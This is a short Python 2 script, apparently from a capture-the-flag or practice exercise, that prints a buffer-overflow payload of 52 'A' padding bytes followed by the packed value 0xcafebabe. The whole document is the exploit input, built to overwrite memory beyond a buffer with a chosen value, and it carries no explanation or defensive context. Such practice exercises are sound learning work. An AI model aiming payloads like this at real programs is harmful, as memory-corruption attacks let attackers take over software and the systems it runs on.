import struct

padding = 13*4*'A'
value = struct.pack('I', 0xcafebabe)

print padding + value
